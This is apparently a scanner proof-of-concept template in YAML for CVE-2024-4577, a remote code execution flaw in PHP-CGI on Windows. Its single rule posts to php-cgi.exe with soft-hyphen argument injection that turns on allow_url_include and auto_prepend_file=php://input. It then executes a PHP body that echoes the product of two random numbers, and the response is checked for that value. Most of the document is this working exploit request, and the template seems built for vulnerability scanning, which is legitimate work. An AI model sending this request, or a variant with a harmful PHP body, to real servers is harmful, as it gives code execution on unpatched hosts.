name: poc-yaml-PHP-CGI-Windows-RCE-CVE-2024-4577
set:
  r2: randomInt(40000, 44800)
  r3: randomInt(40000, 44800)
rules:
  - method: POST
    path: "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    body: |
      <?php echo "{{r2*r3}}";?>
    expression: |
      response.status == 200 && response.body.bcontains(bytes(string({{r2*r3}})))
detail:
  author: yishuizhe
  name: PHP CGI Windows平台远程代码执行漏洞(CVE-2024-4577)